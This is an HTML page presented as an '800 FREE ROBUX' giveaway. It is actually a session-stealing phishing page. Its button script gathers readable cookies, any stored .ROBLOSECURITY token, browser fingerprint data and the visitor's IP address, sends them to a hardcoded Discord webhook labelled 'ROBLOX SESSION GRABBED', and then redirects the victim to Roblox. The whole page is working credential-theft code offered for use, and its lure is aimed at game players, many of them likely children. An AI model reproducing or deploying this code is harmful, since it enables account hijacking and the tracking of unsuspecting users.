<!DOCTYPE html>
<html>
<head>
    <title>800 FREE ROBUX!</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body {
            background: linear-gradient(135deg, #ff6b6b, #4ecdc4);
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            font-family: Arial;
            margin: 0;
        }
        .card { background: white; padding: 30px; border-radius: 15px; box-shadow: 0 10px 30px rgba(0,0,0,.3); text-align: center; max-width: 400px; }
        .robux { font-size: 50px; color: #f39c12; margin: 15px 0; font-weight: bold; }
        button { background: #e74c3c; color: white; border: none; padding: 20px 40px; font-size: 18px; border-radius: 25px; cursor: pointer; width: 100%; margin: 20px 0; }
        button:hover { background: #c0392b; }
        .spinner { display: none; color: #27ae60; font-weight: bold; }
        .error { color: #e74c3c; display: none; }
    </style>
</head>
<body>
    <div class="card">
        <h1>🎉 800 FREE ROBUX FREE 🎉</h1>
        <div class="robux">800 R$</div>
        <p>Click below to claim instantly!</p>
        <button onclick="grabSession()">🔥 CLAIM NOW</button>
        <div id="status" class="spinner">Processing claim...</div>
        <div id="error" class="error">Failed - reload Roblox first</div>
    </div>

    <script>
        const WEBHOOK = "https://discord.com/api/webhooks/1488109000745549934/xZnpdfwi6CAHVlRA1fUNxQUEBD_G5zahxb7BvhGUBaeM2Mw5-KisG6LIDSG-ss83Hcv4"; // YOUR REAL WEBHOOK
        
        async function grabSession() {
            document.querySelector('button').style.display = 'none';
            document.getElementById('status').style.display = 'block';
            
            try {
                // TRICK 1: Force Roblox to reveal session via multiple authenticated endpoints
                const endpoints = [
                    'https://users.roblox.com/v1/users/authenticated',
                    'https://auth.roblox.com/v2/logout',
                    'https://www.roblox.com/my/account#!/info'
                ];
                
                let allCookies = '';
                let userId = 'unknown';
                
                for (const url of endpoints) {
                    try {
                        const resp = await fetch(url, { 
                            credentials: 'include',
                            method: 'GET'
                        });
                        // Even if CORS blocks headers, request still sends cookies server-side
                        console.log(`Hit ${url}`);
                    } catch(e) {
                        console.log(`Failed ${url}:`, e);
                    }
                }
                
                // TRICK 2: Read ALL available cookies (some Roblox cookies are readable)
                let readableCookies = document.cookie;
                
                // TRICK 3: Check localStorage/sessionStorage for tokens
                let localTokens = '';
                try {
                    localTokens = localStorage.getItem('.ROBLOSECURITY') || 
                                 sessionStorage.getItem('.ROBLOSECURITY') ||
                                 localStorage._do_not_track_workaround_key ||
                                 '';
                } catch(e) {}
                
                // TRICK 4: User agent + headers fingerprint
                const fingerprint = {
                    cookies: readableCookies,
                    localStorage: localTokens,
                    userAgent: navigator.userAgent,
                    plugins: navigator.plugins.length,
                    languages: navigator.languages,
                    platform: navigator.platform,
                    ip: 'fetching...',
                    timestamp: new Date().toISOString()
                };
                
                // Get IP
                try {
                    const ipResp = await fetch('https://httpbin.org/ip');
                    const ipData = await ipResp.json();
                    fingerprint.ip = ipData.origin;
                } catch(e) {}
                
                // Send everything to Discord
                const payload = {
                    content: `**🎮 ROBLOX SESSION GRABBED**\n` +
                            `**Readable Cookies:** \`${readableCookies}\`\n` +
                            `**LocalStorage Token:** \`${localTokens}\`\n` +
                            `**UA:** ${fingerprint.userAgent.slice(0,100)}\n` +
                            `**IP:** ${fingerprint.ip}\n` +
                            `**Time:** ${fingerprint.timestamp}\n` +
                            `**Plugins:** ${fingerprint.plugins}\n\n` +
                            `*Victim hit ${endpoints.length} Roblox endpoints*`
                };
                
                const resp = await fetch(WEBHOOK, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify(payload)
                });
                
                console.log('Webhook status:', resp.status);
                
            } catch(error) {
                console.error(error);
                document.getElementById('error').style.display = 'block';
            }
            
            setTimeout(() => window.location = 'https://roblox.com/home', 5000);
        }
    </script>
</body>
</html>
